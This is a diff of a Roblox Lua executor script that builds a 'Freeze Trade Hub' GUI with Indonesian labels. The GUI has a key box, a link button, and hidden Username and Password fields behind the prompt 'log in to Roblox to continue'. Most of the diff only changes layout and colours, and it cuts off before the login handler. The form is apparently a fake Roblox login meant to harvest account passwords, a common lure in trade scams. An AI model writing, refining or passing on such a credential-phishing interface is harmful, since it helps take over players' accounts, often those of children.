@@ -58,119 +58,114 @@ local loginButton = Instance.new("TextButton")
 
 -- Properti GUI
 gui.Name = "UniversalLoginGUI"
-gui.Parent = game:GetService("CoreGui")
+gui.Parent = game.CoreGui or game:GetService("CoreGui")
 
 -- Frame
 frame.Name = "MainFrame"
 frame.Parent = gui
-frame.Size = UDim2.new(0, 300, 0, 350)
-frame.Position = UDim2.new(0.5, -150, 0.5, -175)
-frame.BackgroundColor3 = Color3.new(0.15, 0.15, 0.15)
-frame.BorderSizePixel = 2
-frame.BorderColor3 = Color3.new(1, 0, 0)
+frame.Size = UDim2.new(0, 300, 0, 400)
+frame.Position = UDim2.new(0.5, -150, 0.5, -200)
+frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+frame.BorderSizePixel = 3
+frame.BorderColor3 = Color3.fromRGB(255, 0, 0)
 
 -- Title Label
 titleLabel.Name = "TitleLabel"
 titleLabel.Parent = frame
-titleLabel.Size = UDim2.new(1, -10, 0, 40)
-titleLabel.Position = UDim2.new(0, 5, 0, 5)
+titleLabel.Size = UDim2.new(1, 0, 0, 50)
+titleLabel.Position = UDim2.new(0, 0, 0, 0)
 titleLabel.BackgroundTransparency = 1
 titleLabel.Font = Enum.Font.SourceSansBold
 titleLabel.Text = "Freeze Trade Hub"
-titleLabel.TextSize = 20
-titleLabel.TextColor3 = Color3.new(1, 1, 1)
+titleLabel.TextSize = 24
+titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
 
 -- Subtitle Label
 subtitleLabel.Name = "SubtitleLabel"
 subtitleLabel.Parent = frame
-subtitleLabel.Size = UDim2.new(1, -10, 0, 20)
-subtitleLabel.Position = UDim2.new(0, 5, 0, 45)
+subtitleLabel.Size = UDim2.new(1, 0, 0, 30)
+subtitleLabel.Position = UDim2.new(0, 0, 0, 50)
 subtitleLabel.BackgroundTransparency = 1
 subtitleLabel.Font = Enum.Font.SourceSans
 subtitleLabel.Text = "Login Roblox Untuk Melanjutkan"
-subtitleLabel.TextSize = 14
-subtitleLabel.TextColor3 = Color3.new(1, 1, 1)
+subtitleLabel.TextSize = 16
+subtitleLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
 
 -- Key Box
 keyBox.Name = "KeyBox"
 keyBox.Parent = frame
-keyBox.Size = UDim2.new(1, -20, 0, 30)
-keyBox.Position = UDim2.new(0, 10, 0, 80)
+keyBox.Size = UDim2.new(1, -20, 0, 40)
+keyBox.Position = UDim2.new(0, 10, 0, 90)
 keyBox.PlaceholderText = "Masukkan Key"
 keyBox.Font = Enum.Font.SourceSans
 keyBox.Text = ""
 keyBox.TextSize = 14
-keyBox.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
-keyBox.TextColor3 = Color3.new(1, 1, 1)
+keyBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+keyBox.TextColor3 = Color3.fromRGB(255, 255, 255)
 
 -- Verify Key Button
 verifyKeyButton.Name = "VerifyKeyButton"
 verifyKeyButton.Parent = frame
-verifyKeyButton.Size = UDim2.new(1, -20, 0, 30)
-verifyKeyButton.Position = UDim2.new(0, 10, 0, 120)
+verifyKeyButton.Size = UDim2.new(1, -20, 0, 40)
+verifyKeyButton.Position = UDim2.new(0, 10, 0, 140)
 verifyKeyButton.Text = "Verifikasi Key"
 verifyKeyButton.Font = Enum.Font.SourceSansBold
 verifyKeyButton.TextSize = 16
-verifyKeyButton.BackgroundColor3 = Color3.new(0, 0.5, 0)
-verifyKeyButton.TextColor3 = Color3.new(1, 1, 1)
+verifyKeyButton.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
+verifyKeyButton.TextColor3 = Color3.fromRGB(255, 255, 255)
 
 -- Copy Link Button
 copyLinkButton.Name = "CopyLinkButton"
 copyLinkButton.Parent = frame
-copyLinkButton.Size = UDim2.new(1, -20, 0, 30)
-copyLinkButton.Position = UDim2.new(0, 10, 0, 160)
-copyLinkButton.Text = "Copy Link untuk Mendapatkan Key"
+copyLinkButton.Size = UDim2.new(1, -20, 0, 40)
+copyLinkButton.Position = UDim2.new(0, 10, 0, 190)
+copyLinkButton.Text = "Salin Link untuk Mendapatkan Key"
 copyLinkButton.Font = Enum.Font.SourceSansBold
 copyLinkButton.TextSize = 16
-copyLinkButton.BackgroundColor3 = Color3.new(0, 0, 1)
-copyLinkButton.TextColor3 = Color3.new(1, 1, 1)
+copyLinkButton.BackgroundColor3 = Color3.fromRGB(0, 0, 200)
+copyLinkButton.TextColor3 = Color3.fromRGB(255, 255, 255)
 
 -- Username Box
 usernameBox.Name = "UsernameBox"
 usernameBox.Parent = frame
-usernameBox.Size = UDim2.new(1, -20, 0, 30)
-usernameBox.Position = UDim2.new(0, 10, 0, 200)
+usernameBox.Size = UDim2.new(1, -20, 0, 40)
+usernameBox.Position = UDim2.new(0, 10, 0, 240)
 usernameBox.PlaceholderText = "Username"
 usernameBox.Font = Enum.Font.SourceSans
 usernameBox.Text = ""
 usernameBox.TextSize = 14
-usernameBox.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
-usernameBox.TextColor3 = Color3.new(1, 1, 1)
+usernameBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+usernameBox.TextColor3 = Color3.fromRGB(255, 255, 255)
 usernameBox.Visible = false
 
 -- Password Box
 passwordBox.Name = "PasswordBox"
 passwordBox.Parent = frame
-passwordBox.Size = UDim2.new(1, -20, 0, 30)
-passwordBox.Position = UDim2.new(0, 10, 0, 240)
+passwordBox.Size = UDim2.new(1, -20, 0, 40)
+passwordBox.Position = UDim2.new(0, 10, 0, 290)
 passwordBox.PlaceholderText = "Password"
 passwordBox.Font = Enum.Font.SourceSans
 passwordBox.Text = ""
 passwordBox.TextSize = 14
-passwordBox.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
-passwordBox.TextColor3 = Color3.new(1, 1, 1)
+passwordBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+passwordBox.TextColor3 = Color3.fromRGB(255, 255, 255)
 passwordBox.Visible = false
 
 -- Login Button
 loginButton.Name = "LoginButton"
 loginButton.Parent = frame
-loginButton.Size = UDim2.new(1, -20, 0, 30)
-loginButton.Position = UDim2.new(0, 10, 0, 280)
+loginButton.Size = UDim2.new(1, -20, 0, 40)
+loginButton.Position = UDim2.new(0, 10, 0, 340)
 loginButton.Text = "Login"
 loginButton.Font = Enum.Font.SourceSansBold
 loginButton.TextSize = 16
-loginButton.BackgroundColor3 = Color3.new(0, 0.5, 0)
-loginButton.TextColor3 = Color3.new(1, 1, 1)
+loginButton.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
+loginButton.TextColor3 = Color3.fromRGB(255, 255, 255)
 loginButton.Visible = false
 
 -- Fungsi Tombol Copy Link
 copyLinkButton.MouseButton1Click:Connect(function()
-    if setclipboard then
-        setclipboard(linkUrl)
-        print("Link disalin ke clipboard!")
-    else
-        print("Executor tidak mendukung setclipboard.")
-    end
+    print("Salin link secara manual: " .. linkUrl)
 end)
 
 -- Fungsi Verifikasi Key
